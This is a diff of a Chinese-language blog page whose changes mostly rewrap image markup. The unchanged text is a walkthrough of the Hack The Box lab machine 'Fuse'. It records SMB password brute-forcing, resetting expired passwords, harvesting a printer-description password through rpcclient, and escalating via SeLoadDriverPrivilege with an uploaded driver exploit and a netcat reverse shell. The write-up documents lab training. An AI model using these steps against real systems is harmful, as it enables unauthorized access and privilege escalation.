@@ -127,7 +127,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -222,15 +222,36 @@
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接访问无法访问，根据跳转加hosts：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.193 fuse.fabricorp.local</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071302.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据能够查看的CSV文件整理得到一些用户名：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat users.txt </span><br><span class="line">pmerton</span><br><span class="line">tlavel</span><br><span class="line">sthompson</span><br><span class="line">bhult</span><br></pre></td></tr></table></figure>
 
 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>smb可以匿名登录，没什么信息：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071303.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071303.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="em4linux"><a href="#em4linux" class="headerlink" title="em4linux"></a>em4linux</h2><p> 没什么信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Domain Name: FABRICORP</span><br><span class="line">Domain Sid: S-1-5-21-2633719317-1471316042-3957863514</span><br></pre></td></tr></table></figure>
 
@@ -238,13 +259,34 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -d 5 -m 3 -w wordlist.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers</span><br></pre></td></tr></table></figure>
 
 <h1 id="smb爆破"><a href="#smb爆破" class="headerlink" title="smb爆破"></a>smb爆破</h1><p>使用已有的用户名和密码字典爆破：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071304.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\tlavel:Fabricorp01'</span><br><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\bhult:Fabricorp01'</span><br></pre></td></tr></table></figure>
 
 <p>但无法直接使用，提示NT_STATUS_PASSWORD_MUST_CHANGE：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071305.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="smbpasswd"><a href="#smbpasswd" class="headerlink" title="smbpasswd"></a>smbpasswd</h2><p>可以使用旧密码，通过smbpasswd修改密码，之后使用新密码，注意密码需要满足规则：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071306.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071306.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="rpc-enum"><a href="#rpc-enum" class="headerlink" title="rpc enum"></a>rpc enum</h1><p>使用我们修改的新密码通过rpc获取信息，前面修改密码后需要尽快使用，应该是会自动还原为原密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U FABRICORP\\tlavel 10.10.10.193</span><br><span class="line">Enter FABRICORP\tlavel's password:</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[svc-print] rid:[0x450]</span><br><span class="line">user:[bnielson] rid:[0x451]</span><br><span class="line">user:[sthompson] rid:[0x641]</span><br><span class="line">user:[tlavel] rid:[0x642]</span><br><span class="line">user:[pmerton] rid:[0x643]</span><br><span class="line">user:[svc-scan] rid:[0x645]</span><br><span class="line">user:[bhult] rid:[0x1bbd]</span><br><span class="line">user:[dandrews] rid:[0x1bbe]</span><br><span class="line">user:[mberbatov] rid:[0x1db1]</span><br><span class="line">user:[astein] rid:[0x1db2]</span><br><span class="line">user:[dmuir] rid:[0x1db3]</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumprivs</span><br><span class="line">found 35 privileges</span><br><span class="line"></span><br><span class="line">SeCreateTokenPrivilege 		0:2 (0x0:0x2)</span><br><span class="line">SeAssignPrimaryTokenPrivilege 		0:3 (0x0:0x3)</span><br><span class="line">SeLockMemoryPrivilege 		0:4 (0x0:0x4)</span><br><span class="line">SeIncreaseQuotaPrivilege 		0:5 (0x0:0x5)</span><br><span class="line">SeMachineAccountPrivilege 		0:6 (0x0:0x6)</span><br><span class="line">SeTcbPrivilege 		0:7 (0x0:0x7)</span><br><span class="line">SeSecurityPrivilege 		0:8 (0x0:0x8)</span><br><span class="line">SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)</span><br><span class="line">SeLoadDriverPrivilege 		0:10 (0x0:0xa)</span><br><span class="line">SeSystemProfilePrivilege 		0:11 (0x0:0xb)</span><br><span class="line">SeSystemtimePrivilege 		0:12 (0x0:0xc)</span><br><span class="line">SeProfileSingleProcessPrivilege 		0:13 (0x0:0xd)</span><br><span class="line">SeIncreaseBasePriorityPrivilege 		0:14 (0x0:0xe)</span><br><span class="line">SeCreatePagefilePrivilege 		0:15 (0x0:0xf)</span><br><span class="line">SeCreatePermanentPrivilege 		0:16 (0x0:0x10)</span><br><span class="line">SeBackupPrivilege 		0:17 (0x0:0x11)</span><br><span class="line">SeRestorePrivilege 		0:18 (0x0:0x12)</span><br><span class="line">SeShutdownPrivilege 		0:19 (0x0:0x13)</span><br><span class="line">SeDebugPrivilege 		0:20 (0x0:0x14)</span><br><span class="line">SeAuditPrivilege 		0:21 (0x0:0x15)</span><br><span class="line">SeSystemEnvironmentPrivilege 		0:22 (0x0:0x16)</span><br><span class="line">SeChangeNotifyPrivilege 		0:23 (0x0:0x17)</span><br><span class="line">SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)</span><br><span class="line">SeUndockPrivilege 		0:25 (0x0:0x19)</span><br><span class="line">SeSyncAgentPrivilege 		0:26 (0x0:0x1a)</span><br><span class="line">SeEnableDelegationPrivilege 		0:27 (0x0:0x1b)</span><br><span class="line">SeManageVolumePrivilege 		0:28 (0x0:0x1c)</span><br><span class="line">SeImpersonatePrivilege 		0:29 (0x0:0x1d)</span><br><span class="line">SeCreateGlobalPrivilege 		0:30 (0x0:0x1e)</span><br><span class="line">SeTrustedCredManAccessPrivilege 		0:31 (0x0:0x1f)</span><br><span class="line">SeRelabelPrivilege 		0:32 (0x0:0x20)</span><br><span class="line">SeIncreaseWorkingSetPrivilege 		0:33 (0x0:0x21)</span><br><span class="line">SeTimeZonePrivilege 		0:34 (0x0:0x22)</span><br><span class="line">SeCreateSymbolicLinkPrivilege 		0:35 (0x0:0x23)</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege 		0:36 (0x0:0x24)</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumprinters</span><br><span class="line">	flags:[0x800000]</span><br><span class="line">	name:[\\10.10.10.193\HP-MFT01]</span><br><span class="line">	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]</span><br><span class="line">	comment:[]</span><br><span class="line"></span><br><span class="line">rpcclient $&gt;</span><br></pre></td></tr></table></figure>
 
@@ -259,7 +301,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\svc-print:$fab@s3Rv1ce$1'</span><br><span class="line">[+] 10.10.10.193:445      - 10.10.10.193:445 - Success: '.\svc-scan:$fab@s3Rv1ce$1'</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>svc-print通过evil-winrm登录，桌面得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071307.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071307.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name           SID</span><br><span class="line">=================== ==============================================</span><br><span class="line">fabricorp\svc-print S-1-5-21-2633719317-1471316042-3957863514-1104</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ==================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">FABRICORP\IT_Accounts                      Group            S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\High Mandatory Level       Label            S-1-16-12288</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeLoadDriverPrivilege         Load and unload device drivers Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support for Dynamic Access Control on this device has been disabled.</span><br></pre></td></tr></table></figure>
 
 <p> 可以看到：</p>
@@ -273,9 +322,25 @@
 <p>这里有编译好的利用程序，自己修改netcat.bat内容就可以：</p>
 <p><a href="https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse" target="_blank" rel="noopener">https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse</a></p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p> 直接把所有文件传上去运行即可：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071308.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071308.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>监听端口得到system shell，administrator用户桌面得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071309.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071309.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Abusing SeLoadDriverPrivilege for privilege escalation - Tarlogic Security - Cyber Security and Ethical hacking<br><a href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" target="_blank" rel="noopener">https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/</a></li>
 <li>Privileged Accounts and Token Privileges - HackTricks<br><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege" target="_blank" rel="noopener">https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege</a></li>
